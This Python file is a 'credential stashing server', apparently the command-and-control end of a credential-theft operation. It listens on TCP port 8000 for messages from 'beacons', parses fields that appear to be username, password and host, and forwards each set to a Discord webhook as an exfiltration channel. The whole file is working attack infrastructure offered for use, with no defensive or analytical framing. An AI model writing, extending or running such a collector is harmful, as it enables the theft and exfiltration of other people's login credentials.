### Simple Python Credential Stashing Server ###
import socket
import base64
import threading
import requests
import os
from datetime import datetime
from dotenv import load_dotenv
load_dotenv()

url=os.getenv("WEBHOOK")
port = 8000


def fwd_discord(msg):
    # Format the string
    split_msg = msg.strip(" ") 
    split_msg = msg.split(":")
    formatted_msg = (f"{split_msg[2]} | {split_msg[0]}:{split_msg[1]}")
    print(f"Sending : {formatted_msg}")

    # Setup Post Request
    post = {}
    data = {
        "content" : formatted_msg,
        "username" : "Retriever"
    }

    # Send and check result
    result = requests.post(url, json = data)
    try:
        result.raise_for_status()
    except requests.exceptions.HTTPError as err:
        print(err)
    else:
        print("Payload delivered successfully, code {}.".format(result.status_code))

# Handle the sockets coming from the beacons
def handle(client_sock, addr):
    # Read the message
    msg_from_client = client_sock.recv(1024)
    msg = msg_from_client.decode()
    # Send to Discord
    fwd_discord(msg)
    return()


def main():
    # Create Socket & Listen
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.bind(("", port))
    server_sock.listen()
    print("Server Is Listening")

    # Listen for connections loop
    while True:
        (client_sock, addr) = server_sock.accept() #Blockin`
        thread = threading.Thread(target = handle, args = (client_sock,addr,))
        thread.start()
        thread.join()
        client_sock.close()
    
main()